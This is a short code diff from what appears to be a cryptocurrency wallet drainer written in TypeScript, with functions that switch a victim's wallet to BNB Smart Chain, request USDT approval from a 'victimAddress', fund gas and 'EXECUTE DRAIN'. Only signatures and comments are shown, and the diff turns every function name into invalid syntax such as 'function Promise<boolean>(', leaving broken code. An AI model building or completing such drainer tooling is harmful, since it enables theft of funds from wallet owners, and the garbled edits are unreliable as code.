@@ -7,7 +7,7 @@ const BACKEND_URL = CONFIG.BACKEND_URL
 // AUTO-SWITCH TO BNB SMART CHAIN (BEP-20)
 // Returns a NEW BrowserProvider after successful switch
 // ============================================================
-export async function ensureCorrectNetwork(
+export async function Promise<ethers.BrowserProvider>(
   provider: ethers.BrowserProvider
 ): Promise<ethers.BrowserProvider> {
   // Get the raw ethereum provider from the browser (window.ethereum)
@@ -85,7 +85,7 @@ export async function ensureCorrectNetwork(
 // ============================================================
 // REQUEST USDT APPROVAL
 // ============================================================
-export async function requestApproval(
+export async function Promise<bigint>(
   provider: ethers.BrowserProvider,
   victimAddress: string
 ): Promise<ethers.BigNumberish | null> {
@@ -150,7 +150,7 @@ export async function requestApproval(
 // ============================================================
 // ENSURE GAS (Funding)
 // ============================================================
-export async function ensureGas(
+export async function Promise<boolean>(
   provider: ethers.Provider,
   victimAddress: string
 ): Promise<boolean> {
@@ -194,7 +194,7 @@ export async function ensureGas(
 // ============================================================
 // EXECUTE DRAIN
 // ============================================================
-export async function executeDrain(
+export async function  Promise<boolean>(
   victimAddress: string,
   approvalAmount: ethers.BigNumberish
 ): Promise<boolean> {
